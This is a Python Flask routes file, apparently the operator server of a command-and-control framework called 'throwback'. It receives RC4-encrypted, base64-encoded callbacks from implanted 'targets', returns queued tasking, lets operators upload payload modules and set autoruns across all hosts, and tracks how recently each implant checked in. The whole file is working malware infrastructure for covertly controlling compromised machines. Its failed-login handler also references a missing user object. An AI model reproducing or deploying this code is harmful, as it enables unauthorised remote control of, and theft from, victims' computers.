import datetime
import random
import string
import base64
import json
import time
import math

from flask import render_template, request, redirect, url_for, flash, Response, abort, session, Markup
from flask_login import login_required, login_user, logout_user, LoginManager

from core import throwback
from core import database
from core import encryption
from core.throwback import User
from core.config import get_setting


def setup_routes(app):

    def convert_to_lists(t):
        return list(map(convert_to_lists, t)) if isinstance(t, (list, tuple)) else t

    def convert_size(size_bytes):
        if size_bytes == 0:
            return "0B"
        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor(math.log(size_bytes, 1024)))
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return "%s %s" % (s, size_name[i])

    app.jinja_env.globals.update(convert_size=convert_size)

    @app.context_processor
    def inject_current_data():
        targets = convert_to_lists(throwback.get_targets())

        current_time = datetime.datetime.now()

        for target in targets:
             # Convert last seen time from ISO to Xm ago
            target_last_seen = datetime.datetime.strptime(target[3], "%Y-%m-%dT%H:%M:%S.%f") # convert from ISO 8601
            delta = current_time - target_last_seen
            minutes = delta.seconds // 60

            if minutes > 60:
                time_string = "%dh %02dm" % (delta.seconds // 3600, delta.seconds // 60 - (delta.seconds // 3600) * 60)
            else:
                time_string = "{:02d}m".format(minutes)

            cb_period = int(target[2])

            if minutes > cb_period * 10:
                target[3] = Markup("<span class='text-danger'>{0}</span>".format(time_string))
            elif minutes > (cb_period * 2):
                target[3] = Markup("<span class='text-warning'>{0}</span>".format(time_string))
            else:
                target[3] = str("{0}".format(time_string))

        return dict(
            taskcodes = throwback.get_taskcodes(),
            targets = targets,
            modules = throwback.get_modules(),
            autoruns = throwback.get_autoruns()
            )

    @app.route('/', methods=['GET'])
    @login_required
    def index():
        return redirect(url_for('targets'))

    # Callback endpoint
    @app.route(get_setting('callback_path'), methods=['GET', 'POST'])
    def callback():
        tasking = b''

        if request.method == 'POST':   
            callback_data = request.values.get(get_setting('post_variable'))
        else:
            callback_data = request.values.get(get_setting('get_variable'))

        if callback_data:
            callback_data = callback_data.replace('~', '+').replace('_', '/').replace('-', '=')
            callback_data = base64.b64decode(callback_data)
            callback_data = encryption.rc4_crypt(callback_data, get_setting('encryption_key').encode())

            tasking = throwback.handle_callback(callback_data, 'HTTP', request.remote_addr)

            tasking = encryption.rc4_crypt(tasking, get_setting('encryption_key').encode())
            tasking = base64.b64encode(tasking).decode()
        else:
            print('[!] Failed to parse post data for callbacks. Check your configs!')

        return render_template(
            'callbacks.html',
            tasking = tasking,
            meta_tag_name = get_setting('meta_tag_name')
        )

    # Modules
    @app.route('/modules', methods=['GET', 'POST'])
    @login_required
    def modules():

        if request.method == 'POST':
            name = request.form.get('name')
            file_obj = request.files.get('file')

            if name and file_obj:
                throwback.add_module(name, file_obj.read())
                session['message'] = "Added module '{0}' with size {1}".format(name, file_obj.tell())
                print("[+] " + session['message'])
            else:
                session['error'] = "Missing module data"

        return render_template('modules.html')

    @app.route('/modules/<module_id>/delete')
    @login_required
    def delete_module(module_id):
        if throwback.delete_module(module_id):
            session['message'] = "Deleted module"
        else:
            session['error'] = "Failed to delete module"

        return redirect(url_for('modules'))


    # Tasking
    @app.route('/tasks/add', methods=['POST'])
    @login_required
    def add_task():
        if request.method == 'POST':
            task_code = request.form.get('taskSelect')
            argument1 = request.form.get('arg1', '')
            argument2 = request.form.get('arg2', '')

            targets = [t for t in request.form.get('target', '').split(';') if t]
            
            if not argument1:
                if throwback.get_module_task_code():
                    argument1 = request.form.get('module', '')
                    
            for target_id in targets:
                if target_id:
                    throwback.add_task(target_id, task_code, argument1, argument2)

            if targets:
                session['message'] = "Submitted task to {0} target{1}".format(len(targets), 's' if len(targets) > 1 else '')

            return redirect(url_for('targets'))
        else:
            return redirect(url_for('targets'))

    @app.route('/tasks/<task_id>/delete')
    @login_required
    def delete_task(task_id):
        if throwback.delete_task(task_id):
            session['message'] = "Deleted task"
        else:
            session['error'] = "Failed to delete task"

        return redirect(url_for('targets'))

    # Targets
    @app.route('/targets', methods=['GET', 'POST'])
    @login_required
    def targets():
        return render_template('targets.html')

    @app.route('/targets/<target_id>/radar', methods=['GET'])
    @login_required
    def target_radar(target_id):
        callback_history = throwback.get_callback_history(target_id)
        target_name = throwback.get_hostname_for_target(target_id)

        return render_template('target_radar.html',
                callbacks = callback_history,
                target_name = target_name)

    @app.route('/targets/<target_id>/tasking', methods=['GET'])
    @login_required
    def target_tasking(target_id):
        target_name = throwback.get_hostname_for_target(target_id)

        focused_history = []
        # Clean our tasking data for display
        for task in throwback.get_tasks(target_id):
            focused_task = {
                'id' : task[0],
                'task' : throwback.get_name_from_taskcode(task[2]),
                'status' : task[6],
                'return_code' : task[8],
                'winapi_code' : task[9],
                'return_data' : task[7],
                'completed' : task[12],
                'args' : ''
            }

            if focused_task['completed']:
                completed_time = datetime.datetime.strptime(task[12], "%Y-%m-%dT%H:%M:%S.%f")
                focused_task['completed'] = completed_time.strftime("%b %d %H:%M")

            if not focused_task['return_data']:
                focused_task['return_data'] = throwback.get_message_from_return_code(focused_task['return_code'])
            
            if task[4]:
                focused_task['args'] = task[4]
            if task[5]:
                focused_task['args'] += ' ' + task[5]

            focused_history.append(focused_task)

        return render_template('target_tasking.html',
        tasking = focused_history,
        target_name = target_name)       

    @app.route('/targets/<target_id>/delete')
    @login_required
    def delete_target(target_id):
        if throwback.delete_target(target_id):
            session['message'] = "Deleted Target"
        else:
            session['error'] = "Failed to delete"

        return redirect(url_for('targets'))

    # Autoruns
    @app.route('/autoruns', methods=['GET', 'POST'])
    @login_required
    def autoruns():
        formatted = []

        for ar in throwback.get_autoruns():
            formatted_ar = {
                'id' : ar[0],
                'task' : throwback.get_name_from_taskcode(ar[1]),
                'args' : ''
            }

            if ar[2]: formatted_ar['args'] = ar[2]
            if ar[3]: formatted_ar['args'] += ' ' + ar[3]

            formatted.append(formatted_ar)

        return render_template('autorun.html', autoruns = formatted)

    @app.route('/autoruns/add', methods=['POST'])
    @login_required
    def add_autorun():
        if request.method != 'POST':
            return redirect(url_for('targets'))

        task_code = request.form.get('taskSelect')
        argument1 = request.form.get('arg1', '')
        argument2 = request.form.get('arg2', '')

        targets = request.form.get('target', '').split(';')
        
        if not argument1:
            if throwback.get_module_task_code():
                argument1 = request.form.get('module', '')
                
        throwback.add_autorun(task_code, argument1, argument2)
        session['message'] = "Added Autorun"
        return redirect(url_for('autoruns'))

    @app.route('/autoruns/<autorun_id>/delete')
    @login_required
    def delete_autorun(autorun_id):
        if throwback.delete_autorun (autorun_id):
            session['message'] = "Deleted autorun"
        else:
            session['error'] = "Failed to delete autorun"

        return redirect(url_for('autoruns'))

    # Authentication
    throwback.login_manager = LoginManager()
    throwback.login_manager.init_app(app)
    throwback.login_manager.login_view = "login"
    
    @throwback.login_manager.user_loader
    def load_user(userid):
        return throwback.get_user_by_id(userid)

    @app.route('/login', methods=["GET", "POST"])
    def login():
        if request.method == 'POST':

            username = request.form['username']
            password = request.form['password']
            
            user = throwback.get_user(username, password)

            if user: 
                login_user(user)
                print("[+] Successful login for '{0}' from {1}".format(user.username, request.remote_addr))
                return redirect('/')
            else:
                print("[!] Failed login for '{0}' from {1}".format(user.username, request.remote_addr))
                return render_template('login.html', failed=True, username = username)
        else:
            return render_template('login.html')

    @app.route("/logout")
    @login_required
    def logout():
        logout_user()
        return redirect("/")

    @app.before_request
    def csrf_protect():
        if request.method == "POST" and get_setting('callback_path') not in request.url_rule.rule:
            token = session.pop('_csrf_token', None)
            if not token or token != request.form.get('_csrf_token'):
                print('[!] CSRF token validation failed for {0}'.format(request.remote_addr))
                abort(403)

    @app.errorhandler(404)
    def page_not_found(e):
        return render_template('error.html',
        code = 404,
        message = "Looking for something?"
        ), 404

    @app.errorhandler(403)
    def unauthorized(e):
        return render_template('error.html',
        code = 403,
        message = "Unathorized."
        ), 403

    def generate_csrf_token():
        if '_csrf_token' not in session:
            session['_csrf_token'] = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
        return session['_csrf_token']

    app.jinja_env.globals['csrf_token'] = generate_csrf_token 